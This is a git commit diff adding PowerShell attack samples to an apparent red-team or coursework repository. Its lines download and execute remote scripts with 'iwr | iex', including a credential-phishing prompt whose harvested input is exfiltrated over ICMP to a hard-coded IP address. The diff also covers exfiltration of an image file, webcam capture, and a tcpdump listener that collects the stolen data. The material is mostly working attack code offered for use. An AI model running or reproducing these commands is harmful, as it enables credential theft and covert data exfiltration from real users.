b49c675ae95afb8915201b869f3bb764aa84e8e3
unknown <209129@student.pwr.edu.pl>
2020-02-16 02:08:44 +0100

    ICMP Credential phish + shortcut to leverage it added

--- Exfiltration/ExfiltrationSamples.ps1
+++ Exfiltration/ExfiltrationSamples.ps1
@@ -3,8 +3,28 @@
 # https://github.com/stefanstranger/PowerShell/blob/master/Get-WebCamp.ps1
 iwr https://raw.githubusercontent.com/stefanstranger/PowerShell/master/Get-WebCamp.ps1 | iex
 
+
+# ICMP exfiltration
+cat .\opencv.png | % { Invoke-ICMPExfil -Target 51.38.185.232 -Payload $_ -Verbose }
+
+# ICMP credential phish
+# https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-CredentialsPhish.ps1
+iwr https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-CredentialsPhish.ps1 | iex
+Invoke-CredentialsPhish | % { Invoke-ICMPExfil -Target 51.38.185.232 -Payload $_ -Verbose }
+
+# ICMP SERVER
+tcpdump -i ens3 'icmp and icmp[icmptype]=icmp-echo' -lA -s 0 | grep '89-64-40-243' -A 15 | grep -v 'IP' | grep -v 'end' | grep -v 'begin' | cut -c 29-
+
+iwr https://raw.githubusercontent.com/aptmasterclass/powershell-kungfu/master/exfil/Invoke-ICMPExfil.ps1 | iex
+
+
+# DNS
+# See TXT record
+nslookup -type=TXT google.com
+
 # Resources
 
 # https://aptmasterclass.com/bsides19/BSides19-C2-sources.html
 # Reload env
 $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
+
